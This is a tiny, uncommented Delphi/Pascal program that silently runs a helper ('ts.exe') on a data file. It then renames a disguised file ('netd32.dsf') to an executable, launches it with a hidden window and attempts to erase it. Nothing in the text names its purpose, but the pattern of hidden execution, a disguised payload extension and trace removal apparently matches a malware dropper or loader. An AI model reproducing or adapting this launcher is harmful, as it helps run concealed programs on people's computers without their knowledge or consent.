program netsc;

uses
  Windows;

var
  f: Text;

begin
  WinExec('ts.exe netd32.tsf',0);
  Sleep(7000);
  AssignFile(f,'netd32.dsf');
  Rename(f,'netd32.exe');
  WinExec('netd32.exe',0);
  Sleep(2000);
  Erase(f)
end.
